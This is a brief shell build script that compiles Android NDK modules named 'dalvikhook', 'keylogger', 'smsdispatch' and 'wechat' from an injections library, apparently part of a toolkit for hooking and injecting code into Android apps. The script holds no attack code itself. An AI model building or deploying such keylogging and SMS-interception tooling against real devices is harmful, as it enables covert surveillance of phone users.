#!/bin/sh

echo "building dalvikhook"
cd dalvikhook/jni
ndk-build
cd ../..

echo "building injections_lib"
cd injections_libs
echo "building ij:keylogger"
cd keylogger/jni
ndk-build
cd ../..

echo "building ij:smsdispatch"
cd smsdispatch/jni
ndk-build V=1 
cd ../..

echo "building ij:wechar"
cd wechat/jni
ndk-build V=1 
cd ../..

cd ..

